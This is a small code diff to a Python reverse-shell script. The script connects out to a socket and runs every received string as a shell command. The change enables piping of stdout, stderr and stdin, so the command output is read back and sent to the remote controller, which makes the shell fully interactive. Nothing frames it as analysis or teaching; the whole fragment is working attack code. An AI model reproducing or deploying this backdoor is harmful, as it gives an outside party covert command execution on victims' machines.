@@ -14,7 +14,7 @@ sock.connect((ip,port))
 """
 while True:
     #rep = subprocess.Popen("echo %cd%",shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
-    shell = subprocess.Popen(sock.recv(9999),shell = True)#, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
+    shell = subprocess.Popen(sock.recv(9999),shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
     shell = shell.stdout.read() + shell.stderr.read()
     sock.send(shell)
     
